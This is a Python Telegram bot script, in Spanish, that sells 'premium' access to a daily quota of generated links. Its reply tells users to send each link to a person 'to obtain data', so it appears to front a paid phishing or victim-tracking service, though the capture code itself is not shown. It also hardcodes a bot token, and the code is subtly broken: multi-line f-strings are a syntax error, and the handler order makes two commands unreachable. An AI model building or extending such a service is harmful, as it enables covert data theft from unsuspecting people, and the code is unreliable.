
import telebot
import json
import time
from datetime import datetime, timedelta

TOKEN = '7989493923:AAEPVAk7HInjBeu8lLP6lvCe6dzIXKAEx9o'
bot = telebot.TeleBot(TOKEN)

# Cargar datos premium
try:
    with open('premium.json', 'r') as f:
        premium_users = json.load(f)
except:
    premium_users = {}

# Cargar logs
try:
    with open('logs.json', 'r') as f:
        logs = json.load(f)
except:
    logs = {}

# Contador de enlaces por usuario
daily_limit = 12

def save_premium():
    with open('premium.json', 'w') as f:
        json.dump(premium_users, f)

def save_logs():
    with open('logs.json', 'w') as f:
        json.dump(logs, f)

def is_premium(user_id):
    user = premium_users.get(str(user_id))
    if user:
        expire = datetime.strptime(user['expire'], '%Y-%m-%d')
        return expire >= datetime.now()
    return False

def reset_daily_counts():
    for uid in logs:
        logs[uid]['count'] = 0
    save_logs()

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.from_user.id)
    if user_id not in logs:
        logs[user_id] = {'count': 0, 'username': message.from_user.username}
        save_logs()
    bot.reply_to(message, f"👋 ¡Bienvenido, {message.from_user.first_name}! Soy Obito GPT Bot. Usa los botones para comenzar.")

@bot.message_handler(commands=['addpremium'])
def add_premium(message):
    admin_id = 'TU_ID_ADMIN'
    if str(message.from_user.id) != admin_id:
        return
    try:
        _, uid, days = message.text.split()
        expire_date = (datetime.now() + timedelta(days=int(days))).strftime('%Y-%m-%d')
        premium_users[uid] = {'expire': expire_date}
        save_premium()
        bot.reply_to(message, f"✅ Usuario {uid} agregado como premium por {days} días.")
    except:
        bot.reply_to(message, "Uso: /addpremium user_id días")

@bot.message_handler(func=lambda m: True)
def handle_all(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    if user_id not in logs:
        logs[user_id] = {'count': 0, 'username': username}
        save_logs()
    if is_premium(user_id):
        if logs[user_id]['count'] >= daily_limit:
            bot.reply_to(message, "⚠️ Has alcanzado tu límite diario de 12 enlaces.")
            return
        logs[user_id]['count'] += 1
        save_logs()
        bot.reply_to(message, f"✅ Enlace generado para {message.text}.
📍 Enviame el enlace a la persona para obtener datos.")
    else:
        bot.reply_to(message, "🚫 No eres premium. Usa /comprar para obtener acceso.")

@bot.message_handler(commands=['stats'])
def show_stats(message):
    admin_id = 'TU_ID_ADMIN'
    if str(message.from_user.id) != admin_id:
        return
    total_users = len(logs)
    total_premium = sum(1 for u in premium_users if is_premium(u))
    bot.reply_to(message, f"📊 Estadísticas:
👥 Usuarios totales: {total_users}
⭐ Usuarios premium activos: {total_premium}")

@bot.message_handler(commands=['comprar'])
def buy_info(message):
    bot.reply_to(message, "💸 Para comprar premium, envía tu ID a @Obito_UchihaX")

bot.polling()
